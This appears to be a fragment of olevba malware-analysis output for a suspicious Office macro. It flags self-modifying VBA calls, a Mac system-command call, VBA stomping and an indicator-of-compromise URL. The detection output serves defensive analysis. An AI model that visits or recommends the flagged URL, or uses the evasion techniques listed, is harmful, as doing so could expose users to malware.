|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.escalix.c|URL                                          |
|          |om/freepage/angel   |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

